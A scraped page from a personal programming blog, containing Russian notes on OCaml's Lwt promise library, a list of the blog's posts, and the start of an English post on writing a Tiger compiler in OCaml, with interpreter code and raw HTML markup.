Вытесняющая многозадачность означает, что у нас есть некий планировщик, принимающий решения о том, когда будет выполняться какой поток, обычно принимая во внимание приоритет потоков и выделяя им некие кванты времени. Этот вид многозадачности используется в большинстве современных ОС.
Кооперативная многозадачность – планировщик не принимает решение о переключении потоков. Поток должен явно сигнализировать о том, что он готов прерваться и предоставить процессорное время другим потокам.
Асинхронное программирование с Lwt и промисы Link to heading Lwt предоставляет нам тип данных &#39;a Lwt.t. Можно относиться к нему, как к “потоку”. Это обычный промис, содержащий некоторое значение типа &#39;a, которое может быть вычислено, например, когда-то в будущем, но только один раз. В терминах OCaml это просто &#39;a ref, который будет заполнен позже. Изначально значения в нём нет и промис находится в состоянии Sleep (pending). Когда вычисление завершено успешно, Lwt помещает результат типа &#39;a в наш промис и его состояние становится Return (resolved). В случае же неудачи его состояние изменяется на Fail (rejected) и в него помещается произошедшая ошибка.
API
Вот как выглядит тип, описывающий состояния:
type &#39;a state = | Return of &#39;a | Fail of exn | Sleep Lwt предоставляет несколько полезных ф-ций:
val return : &#39;a -&gt; &#39;a Ltw.t Понятно, что эта ф-ция тривиально упаковывает уже известно значение в промис. Соответственно, этот промис сразу находится в состоянии Return (resolved).
Значения, упакованные в Lwt.t, не могут быть просто извлечены (т.к. вычисление может быть ещё не завершено). Для этого мы должны использовать оператор bind:
val (&gt;&gt;=): &#39;a Lwt.t -&gt; (&#39;a -&gt; &#39;b Lwt.t) -&gt; &#39;b Lwt.t Такая конструкция позволяет нам делать композицию промисов в “монадическом” стиле.
f &gt;&gt;= g создаст нам промис, который ждёт пока завершится “поток” f : &#39;a Lwt.t, получает результат его вычислений (некий x : &#39;a) и передаёт его в ф-цию g : &#39;a -&gt; &#39;b Ltw.t, которая запускает поток &#39;b Ltw.t. Если f находится в состоянии pending, то и f &gt;&gt;= g будет в состоянии pending. Соответственно, если f завершится с ошибкой, то и f &gt;&gt;= g завершится с той же самой ошибкой.
Несколько других полезных ф-ций:
val join : unit Lwt.t list -&gt; unit Lwt.t join получает список потоков и ожидает пока они все завершатся. Если хотя бы один из них завершится с ошибкой (перейдёт в состояние rejected), то и результирующий поток завершится с той же ошибкой (после того, как все остальные потоки завершат свои вычисления).
val choose : &#39;a t list -&gt; &#39;a t choose ждёт пока выполнится хотя бы один поток. Если таких оказалось несколько, то в качестве результата выбирается один из них cлучайным образом.
На самом деле их огромное множество и все их можно найти тут.
PPX
У нас есть следующий синтаксический сахар:
let%lwt i = f () in ... Что эквивалентно следующему фрагменту:
Lwt.bind (f ()) (fun i -&gt; ...) Примеры
Следующие примеры я взял из официального туториала
Чтение из STDIN без Lwt, выполнение блокируется пока не поступит пользовательский ввод:
let () = let line : string = Pervasives.read_line () in print_endline &#34;Now unblocked!&#34;; ignore line С промисами Lwt выполнение продолжается:
let () = let line_promise : string Lwt.t = Lwt_io.(read_line stdin) in print_endline &#34;Execution just continues...&#34;; ignore line_promise В данном случае это не совсем то, что нам нужно, т.к. программа сразу завершает работу так и не дождавшись пользовательского ввода. Чтобы заблокироваться и подождать пока промис выполнится мы можем использовать ф-цию Lwt_main.run:
let () = let line_promise : string Lwt.t = Lwt_io.(read_line stdin) in print_endline &#34;Execution just continues...&#34;; let line : string = Lwt_main.run line_promise in ignore line Lwt_main.run используется только 1 раз, чтобы подожать пока завершится промис самого верхнего уровня. Когда этот промис выполнится, программа завершает работу.
Ещё примеры:
Опять же, я не заморачивался и взял примеры из официального туториала, тк я слишком ленивый, чтобы придумывать их самому.
Пример функции, которая печатает “tic” каждую секунду, не блокируя другие “потоки”:
let rec tic () = print_endline &#34;tic&#34;; let%lwt () = Lwt_unix.sleep 1.0 in tic () Пример запуска нескольких “потоков” и ожидание их результатов.
Допустим у нас есть пара ф-ций f и g:
val f : unit -&gt; unit Lwt.t val g : unit -&gt; unit Lwt.t Следующий код запустит их вычисления последовательно:
let%lwt () = f () in let%lwt () = g () in ... А вот так мы можем запустить обе ф-ции конкурентно и сразу же подождать их завершения:
let p1 = f () in let p2 = g () in let%lwt () = p1 in let%lwt () = p2 in ... Пример ф-ции, которая выполняет все вычисления из списка конкрурентно:
let rec map f l = match l with | [] -&gt; Lwt.return [] | v :: r -&gt; let t = f v in let rt = map f r in let%lwt v&#39; = t in let%lwt l&#39; = rt in Lwt.return (v&#39; :: l&#39;) Следующая ф-ция наоборот, ожидает пока выполнится каждое предыдущее вычисление из списка, прежде чем запустить следующее:
let rec map_serial f l = match l with | [] -&gt; return [] | v :: r -&gt; let%lwt v&#39; = f v in let%lwt l&#39; = map_serial f r in Lwt.return (v&#39; :: l&#39;) Конечно, это только самые “вершки” Lwt.
Полезные ссылки Link to heading Promises в книге Functional Programming in OCaml Lwt Gitter Туториал Lwt in 5 minutes Lwt мануал Туториал про то, как сделать простой сервер на сокетах, позволяющий клиентам подключаться, увеличивать счётчик и читать его значение. Emacs @emacsemacs Link to heading DRAFT My first Emacs package: ormolu.el ormolu Link to heading Intro Link to heading I’ve been using Emacs on a daily basis for about 2 years already,
Ormolu is an opinionated zero-configuration formatter for Haskell source code built in Tweag.
DRAFT Writing an Emacs major mode for the Tiger language Link to heading References Link to heading There is a really good tutorial by Xah Lee: Emacs Lisp How to Write Major Mode, which I highly recommend reading.
Formal Methods Link to heading Theorem Provers Link to heading :@theorem_provers:theorem_provers:
Designing a Theorem Prover, Part 1 folderol Link to heading Table of Contents Making of Tiger:@compilers:compilers🐯ocaml: DONE Making of Tiger #1, Intro DONE Making of Tiger #2, Lexical Analysis:lexing:ocamllex: DONE Making of Tiger #3, Parsing:parsing:menhir: DRAFT Making of Tiger #4, Abstract Syntax:ast: TODO Making of Tiger #5, Semantic Analysis:type_checking: DONE Making of Tiger #6, Stack frames:stack:memory: Haskell:@haskell:haskell: TODO A week of Liquid Haskell:@liquid_haskell:liquid_haskell:refinement_types: TODO Building a toy Ethereum-like VM in Haskell:compilers:ethereum:vm: TODO Writing a simple trading bot in Haskell:trading: TODO Notes on parallel &amp; concurrent programming in Haskell OCaml:@ocaml:ocaml: DRAFT Instrumenting and profiling OCaml programs:benchmarking:profiling:performance: DRAFT Benchmarking OCaml code:benchmarking:performance: DONE Заметка о Lwt:lwt: Emacs:@emacs:emacs: DRAFT My first Emacs package: ormolu.el:ormolu: DRAFT Writing an Emacs major mode for the Tiger language Formal Methods Theorem Provers Coq:@coq:coq: Notes on Coq and Ssreflect:ssreflect: Proving TAPL in Coq:tapl: DONE Заметки про типы в Coq (WIP) Rust:@rust:rust: DONE Зелёные потоки в 200 строчек на Rust. Часть 1:@arm64: Assembly:@assembly:assembly: DONE Программирование для ARM64. Часть 1:@arm64: Blockchain:@blockchain:blockchain: Who to follow Hahacks EVM:@evm:@solidity:evm:solidity: Ethereum Security Audit My path to blockchain security audit:security: CTF walkthrough:@ctf:ctf:security: This is a summary.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">




<link rel="canonical" href="https://vyorkin.org/posts/posts/">


<link rel="preload" href="https://vyorkin.org/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://vyorkin.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://vyorkin.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.07092c1350ffd254998dc43a44ae96e617d14af4df4602626878df89189c5e1a.css" integrity="sha256-BwksE1D/0lSZjcQ6RK6W5hfRSvTfRgJiaHjfiRicXho=" crossorigin="anonymous" media="screen" />





  
    
    
    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  




  
  <link rel="stylesheet" href="https://vyorkin.org/custom.min.37b90b4ab2011637071ddd3590a64f81899b71c028d2d366c001566e70ee9e90.css" integrity="sha256-N7kLSrIBFjcHHd01kKZPgYmbccAo0tNmwAFWbnDunpA=" crossorigin="anonymous" media="screen" />


<link rel="icon" type="image/svg+xml" href="https://vyorkin.org/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="https://vyorkin.org/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://vyorkin.org/images/apple-touch-icon.png">

<link rel="manifest" href="https://vyorkin.org/site.webmanifest">
<link rel="mask-icon" href="https://vyorkin.org/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-dark">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://vyorkin.org/">
      vyorkin.org
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://vyorkin.org/about/">about</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://vyorkin.org/posts/">posts</a>
            </li>
          
        
        
          
          
          
            
          
            
              
                <li class="navigation-item menu-separator">
                  <span>|</span>
                </li>
                
              
              <li class="navigation-item">
                <a href="https://vyorkin.org/ru-ru/">ru</a>
              </li>
            
          
            
              
              <li class="navigation-item">
                <a href="https://vyorkin.org/de-de/">de</a>
              </li>
            
          
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://vyorkin.org/posts/posts/">
              
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="1010-01-01T00:00:00Z">
                January 1, 1010
              </time>
            </span>
          </div>
          
          
          
        </div>
      </header>

      <div class="post-content">
        
        <h2 id="making-of-tiger">
  Making of Tiger <span class="tag"><span class="_compilers">@compilers</span><span class="compilers">compilers</span><span class="tiger">tiger</span><span class="ocaml">ocaml</span></span>
  <a class="heading-link" href="#making-of-tiger">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="making-of-tiger-1-intro">
  <span class="org-todo done DONE">DONE</span> Making of Tiger #1, Intro
  <a class="heading-link" href="#making-of-tiger-1-intro">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Recently I&rsquo;ve started reading the book by
<a href="https://en.wikipedia.org/wiki/Andrew_Appel"  class="external-link" target="_blank" rel="noopener">Andrew W. Appel</a>
titled
<a href="https://www.amazon.com/Modern-Compiler-Implement-Andrew-Appel/dp/0521607647"  class="external-link" target="_blank" rel="noopener">Modern
compiler implementation in ML</a>. I&rsquo;ve picked it up because I&rsquo;ve
heard some really good reviews about the ML version of it. Also
there are other editions available that use C and Java. Each
chapter covers a single phase of the compilation process and
comes with some initial ML code and programming excercies. At
the end you will have a working optimizing compiler.</p>
<p>I&rsquo;m building a compiler for the first time and it is a
lot of fun. In these blog post series, I&rsquo;ll be working through
the book and explaining my solutions to each chapter.</p>
<h4 id="getting-started">
  Getting started
  <a class="heading-link" href="#getting-started">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>The author describes Tiger as a simple (but nontrivial) language
of the <a href="https://en.wikipedia.org/wiki/ALGOL"  class="external-link" target="_blank" rel="noopener">Algol family</a>, which could be easily modified to be
functional or object-oriented (maybe I&rsquo;ll skip the OO-part of
the book).</p>
<details>
<summary>Here is an example program in Tiger</summary>
<div class="details">
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-F90" data-lang="F90"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">tree</span> <span style="color:#728e00">=</span> <span style="color:#a61717">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">key</span>: <span style="color:#434f54">string</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">left</span>: <span style="color:#434f54">tree</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">right</span>: <span style="color:#434f54">tree</span>
</span></span><span style="display:flex;"><span><span style="color:#a61717">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#434f54">prettyprint</span>(<span style="color:#434f54">tree</span>: <span style="color:#434f54">tree</span>) : <span style="color:#434f54">string</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">let</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">var</span> <span style="color:#434f54">output</span> :<span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#728e00">write</span>(<span style="color:#434f54">s</span>: <span style="color:#434f54">string</span>) <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">output</span> :<span style="color:#728e00">=</span> <span style="color:#434f54">concat</span>(<span style="color:#434f54">output</span>, <span style="color:#434f54">s</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#434f54">show</span>(<span style="color:#434f54">n</span>: <span style="color:#728e00">int</span>, <span style="color:#434f54">t</span>: <span style="color:#434f54">tree</span>) <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">let</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">function</span> <span style="color:#434f54">indent</span>(<span style="color:#434f54">s</span>: <span style="color:#434f54">string</span>) <span style="color:#728e00">=</span> (
</span></span><span style="display:flex;"><span>          <span style="color:#434f54">for</span> <span style="color:#434f54">i</span> :<span style="color:#728e00">=</span> <span style="color:#8a7b52">1</span> <span style="color:#434f54">to</span> <span style="color:#434f54">n</span> <span style="color:#728e00">do</span>
</span></span><span style="display:flex;"><span>             <span style="color:#728e00">write</span>(<span style="color:#7f8c8d">&#34; &#34;</span>);
</span></span><span style="display:flex;"><span>             <span style="color:#434f54">output</span> :<span style="color:#728e00">=</span> <span style="color:#434f54">concat</span>(<span style="color:#434f54">output</span>, <span style="color:#434f54">s</span>);
</span></span><span style="display:flex;"><span>             <span style="color:#728e00">write</span>(<span style="color:#7f8c8d">&#34;\n&#34;</span>)
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">in</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> <span style="color:#434f54">t</span> <span style="color:#728e00">=</span> <span style="color:#434f54">nil</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">then</span> <span style="color:#434f54">ident</span>(<span style="color:#7f8c8d">&#34;.&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">else</span> (
</span></span><span style="display:flex;"><span>          <span style="color:#434f54">indent</span>(<span style="color:#434f54">t</span>.<span style="color:#434f54">key</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#434f54">show</span>(<span style="color:#434f54">n</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">1</span>, <span style="color:#434f54">t</span>.<span style="color:#434f54">left</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#434f54">show</span>(<span style="color:#434f54">n</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">1</span>, <span style="color:#434f54">t</span>.<span style="color:#434f54">right</span>)
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">end</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">show</span>(<span style="color:#8a7b52">0</span>, <span style="color:#434f54">tree</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">output</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">end</span>
</span></span></code></pre></div></div>
</details>
<p>For my implementation I&rsquo;ve decided to use OCaml. It is
<a href="http://adam.chlipala.net/mlcomp/"  class="external-link" target="_blank" rel="noopener">close</a>
<a href="https://stackoverflow.com/questions/699689/what-are-the-differences-between-sml-and-ocaml/699755#699755"  class="external-link" target="_blank" rel="noopener">enough</a> to SML so with even basic ML experience it should be
fairly straightforward to port the code examples.</p>
<!--list-separator-->
<ul>
<li>
<p>Straight-line programs</p>
<p>The first &ldquo;warm-up&rdquo; assignment is to implement a program
analyzer and interpreter for the <strong>straight-line</strong> programming
language. We have the following types:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">id</span> <span style="color:#728e00">=</span> <span style="color:#00979d">string</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">binop</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Plus</span> <span style="color:#728e00">|</span> <span style="color:#434f54">Minus</span> <span style="color:#728e00">|</span> <span style="color:#434f54">Times</span> <span style="color:#728e00">|</span> <span style="color:#434f54">Div</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">stm</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Compound</span> <span style="color:#728e00">of</span> <span style="color:#434f54">stm</span> <span style="color:#728e00">*</span> <span style="color:#434f54">stm</span>
</span></span><span style="display:flex;"><span>         <span style="color:#728e00">|</span> <span style="color:#434f54">Assign</span> <span style="color:#728e00">of</span> <span style="color:#434f54">id</span> <span style="color:#728e00">*</span> <span style="color:#434f54">exp</span>
</span></span><span style="display:flex;"><span>         <span style="color:#728e00">|</span> <span style="color:#434f54">Print</span> <span style="color:#728e00">of</span> <span style="color:#434f54">exp</span> <span style="color:#00979d">list</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#728e00">and</span> <span style="color:#434f54">exp</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Id</span> <span style="color:#728e00">of</span> <span style="color:#434f54">id</span>
</span></span><span style="display:flex;"><span>         <span style="color:#728e00">|</span> <span style="color:#434f54">Num</span> <span style="color:#728e00">of</span> <span style="color:#00979d">int</span>
</span></span><span style="display:flex;"><span>         <span style="color:#728e00">|</span> <span style="color:#434f54">Op</span> <span style="color:#728e00">of</span> <span style="color:#434f54">exp</span> <span style="color:#728e00">*</span> <span style="color:#434f54">binop</span> <span style="color:#728e00">*</span> <span style="color:#434f54">exp</span>
</span></span><span style="display:flex;"><span>         <span style="color:#728e00">|</span> <span style="color:#434f54">Eseq</span> <span style="color:#728e00">of</span> <span style="color:#434f54">stm</span> <span style="color:#728e00">*</span> <span style="color:#434f54">exp</span>
</span></span></code></pre></div><p>So for the following sample straight-line program</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-F90" data-lang="F90"><span style="display:flex;"><span><span style="color:#434f54">a</span> :<span style="color:#728e00">=</span> <span style="color:#8a7b52">5</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">3</span>;
</span></span><span style="display:flex;"><span><span style="color:#434f54">b</span> :<span style="color:#728e00">=</span> (<span style="color:#728e00">print</span>(<span style="color:#434f54">a</span>, <span style="color:#434f54">a</span> <span style="color:#728e00">-</span> <span style="color:#8a7b52">1</span>), <span style="color:#434f54">a</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">10</span>);
</span></span><span style="display:flex;"><span><span style="color:#728e00">print</span>(<span style="color:#434f54">b</span>)
</span></span></code></pre></div><p>The corresponding AST would be</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#434f54">Compound</span><span style="color:#728e00">(</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">Assign</span><span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;a&#34;</span><span style="color:#728e00">,</span> <span style="color:#434f54">Op</span><span style="color:#728e00">(</span><span style="color:#434f54">Num</span> <span style="color:#434f54">5</span><span style="color:#728e00">,</span> <span style="color:#434f54">Plus</span><span style="color:#728e00">,</span> <span style="color:#434f54">Num</span> <span style="color:#434f54">3</span><span style="color:#728e00">)),</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">Compound</span><span style="color:#728e00">(</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Assign</span><span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;b&#34;</span><span style="color:#728e00">,</span>
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">Eseq</span><span style="color:#728e00">(</span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">Print</span> <span style="color:#728e00">[</span><span style="color:#434f54">Id</span> <span style="color:#7f8c8d">&#34;a&#34;</span><span style="color:#728e00">;</span> <span style="color:#434f54">Op</span><span style="color:#728e00">(</span><span style="color:#434f54">Id</span> <span style="color:#7f8c8d">&#34;a&#34;</span><span style="color:#728e00">,</span> <span style="color:#434f54">Minus</span><span style="color:#728e00">,</span> <span style="color:#434f54">Num</span> <span style="color:#434f54">1</span><span style="color:#728e00">)],</span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">Op</span><span style="color:#728e00">(</span><span style="color:#434f54">Num</span> <span style="color:#434f54">10</span><span style="color:#728e00">,</span> <span style="color:#434f54">Times</span><span style="color:#728e00">,</span> <span style="color:#434f54">Id</span> <span style="color:#7f8c8d">&#34;a&#34;</span><span style="color:#728e00">))),</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Print</span> <span style="color:#728e00">[</span><span style="color:#434f54">Id</span> <span style="color:#7f8c8d">&#34;b&#34;</span><span style="color:#728e00">]))</span>
</span></span></code></pre></div><p>The first task is to write a function</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">maxargs</span> <span style="color:#728e00">:</span> <span style="color:#434f54">stm</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">int</span>
</span></span></code></pre></div><p>This function tells the maximum number of args of any <code>print</code>
statement within any subexpression of a given statement.</p>
<p>Sounds easy, right? The implementation is pretty straightforward
too:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Base</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Straightline</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#728e00">rec</span> <span style="color:#434f54">maxargs</span> <span style="color:#434f54">stm</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">maxargs_exp</span> <span style="color:#728e00">=</span> <span style="color:#728e00">function</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">Eseq</span> <span style="color:#728e00">(</span><span style="color:#434f54">stm</span><span style="color:#728e00">,</span> <span style="color:#728e00">_)</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">maxargs</span> <span style="color:#434f54">stm</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#728e00">_</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">in</span> <span style="color:#728e00">match</span> <span style="color:#434f54">stm</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Print</span> <span style="color:#434f54">exps</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">len</span> <span style="color:#728e00">=</span> <span style="color:#434f54">List</span>.<span style="color:#434f54">length</span> <span style="color:#434f54">exps</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">exp_lens</span> <span style="color:#728e00">=</span> <span style="color:#434f54">List</span>.<span style="color:#434f54">map</span> <span style="color:#728e00">~</span><span style="color:#434f54">f</span><span style="color:#728e00">:</span><span style="color:#434f54">maxargs_exp</span> <span style="color:#434f54">exps</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">max_exp_len</span> <span style="color:#728e00">=</span> <span style="color:#434f54">List</span>.<span style="color:#434f54">max_elt</span> <span style="color:#728e00">~</span><span style="color:#434f54">compare</span><span style="color:#728e00">:</span><span style="color:#434f54">Int</span>.<span style="color:#434f54">compare</span> <span style="color:#434f54">exp_lens</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Int</span>.<span style="color:#434f54">max</span> <span style="color:#434f54">len</span> <span style="color:#728e00">(</span><span style="color:#434f54">Option</span>.<span style="color:#434f54">value</span> <span style="color:#728e00">~</span><span style="color:#434f54">default</span><span style="color:#728e00">:</span><span style="color:#434f54">0</span> <span style="color:#434f54">max_exp_len</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Compound</span> <span style="color:#728e00">(</span><span style="color:#434f54">exp1</span><span style="color:#728e00">,</span> <span style="color:#434f54">exp2</span><span style="color:#728e00">)</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">l1</span> <span style="color:#728e00">=</span> <span style="color:#434f54">maxargs</span> <span style="color:#434f54">exp1</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">l2</span> <span style="color:#728e00">=</span> <span style="color:#434f54">maxargs</span> <span style="color:#434f54">exp2</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Int</span>.<span style="color:#434f54">max</span> <span style="color:#434f54">l1</span> <span style="color:#434f54">l2</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Assign</span> <span style="color:#728e00">(_,</span> <span style="color:#434f54">exp</span><span style="color:#728e00">)</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">maxargs_exp</span> <span style="color:#434f54">exp</span>
</span></span></code></pre></div><p>Next, we need to write another function that &ldquo;interprets&rdquo;
program in this language.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">eval</span> <span style="color:#728e00">:</span> <span style="color:#434f54">stm</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">unit</span>
</span></span></code></pre></div><p>A simple interpreter could look like this:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Base</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Stdio</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Straightline</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">eval</span> <span style="color:#434f54">x</span> <span style="color:#434f54">op</span> <span style="color:#434f54">y</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">match</span> <span style="color:#434f54">op</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Plus</span>  <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">x</span> <span style="color:#728e00">+</span> <span style="color:#434f54">y</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Minus</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">x</span> <span style="color:#728e00">-</span> <span style="color:#434f54">y</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Times</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">x</span> <span style="color:#728e00">*</span> <span style="color:#434f54">y</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Div</span>   <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">x</span> <span style="color:#728e00">/</span> <span style="color:#434f54">y</span>
